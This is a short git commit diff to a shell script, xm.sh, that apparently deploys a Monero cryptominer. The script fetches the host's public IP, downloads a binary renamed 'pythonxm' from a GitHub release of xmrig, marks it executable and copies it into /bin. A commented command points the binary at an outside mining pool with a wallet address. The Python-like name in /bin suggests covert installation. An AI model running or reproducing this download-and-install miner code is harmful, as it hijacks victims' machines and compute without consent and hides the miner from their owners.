fe36b8da685ea07220f3e2249bba5f89bed7a9f3
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-29 22:58:08 +0200

    Update xm.sh

--- xm.sh
+++ xm.sh
@@ -3,7 +3,7 @@ iip=$(curl https://ipecho.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
-wget https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
+wget https://github.com/one10001/xmrig/releases/download/v0.02/pythonxm
 chmod +x pythonxm
 cp pythonxm /bin/pythonxm
 #pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 8 2> logxm.out 1> logxm.out  &
